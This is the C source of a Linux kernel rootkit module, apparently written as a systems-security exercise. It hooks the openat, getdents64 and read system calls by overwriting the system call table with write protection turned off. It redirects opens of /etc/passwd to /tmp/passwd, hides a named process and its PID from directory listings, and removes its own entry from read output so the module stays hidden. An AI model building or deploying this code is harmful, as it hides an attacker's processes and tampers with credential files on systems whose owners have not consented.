#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/dirent.h>
#include <linux/namei.h>
#include <linux/string.h>

#define PREFIX "sneaky_process"

static char *pid = "";
module_param(pid, charp, 0);
MODULE_PARM_DESC(pid, "the sneaky process's process id");

//This is a pointer to the system call table
static unsigned long *sys_call_table;
// // Helper functions, turn on and off the PTE address protection mode
// // for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);
asmlinkage int (*original_getdents64)(struct pt_regs *);
asmlinkage ssize_t (*original_read)(struct pt_regs *);

//Define your new sneaky version of the 'openat' syscall

asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
    const char __user *pathdir = (const char __user *)regs->si;
    char pathname[PATH_MAX];
    unsigned long len;

    len = strnlen_user(pathdir, PATH_MAX - 1);
    if (len < PATH_MAX - 1) {
        if (copy_from_user(pathname, pathdir, len) != 0) {
            return -EFAULT;
        }
        pathname[len] = '\0';
        if (strcmp(pathname, "/etc/passwd") == 0) {
            if (copy_to_user((void __user *)pathdir, "/tmp/passwd", strlen("/tmp/passwd") + 1) != 0) {
                return -EFAULT;
            }
        }
    }
    return (*original_openat)(regs);
}


 asmlinkage int sneaky_sys_getdents64(struct pt_regs* regs){
  int nread = original_getdents64(regs);
  struct linux_dirent64* dirp = (struct linux_dirent64 *)(regs->si);
  int bpos = 0;
  if (nread > 0) { 
    while(bpos < nread){
    struct linux_dirent64* tmp = (void*)dirp + bpos;
    int reclen = tmp->d_reclen;
      if((strcmp(tmp->d_name, PREFIX) == 0) ||(strcmp(tmp->d_name, pid) == 0)){
        int nextLen = (nread - (bpos + reclen));
        void* next = (void*)tmp + reclen;
        memmove((void*)dirp + bpos, next, nextLen);
        nread -= reclen;
      }
      else{
        bpos += reclen;
      }
    }
  }

  return nread;
}

asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs){
  ssize_t nread = original_read(regs);
  void* tmp = (void*)(regs->si);
  if(nread > 0){
    void* start = strnstr(tmp, "sneaky_mod", nread);
    if(start != NULL){
      void* end = strnstr(start, "\n", nread - (start - tmp));
      if(end != NULL){
        int size = end - start + 1;
        memmove(start, end + 1, nread - (start - tmp) - size);
        nread -= size;
      }
    }
  }
  return nread;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read];
  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  
module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");



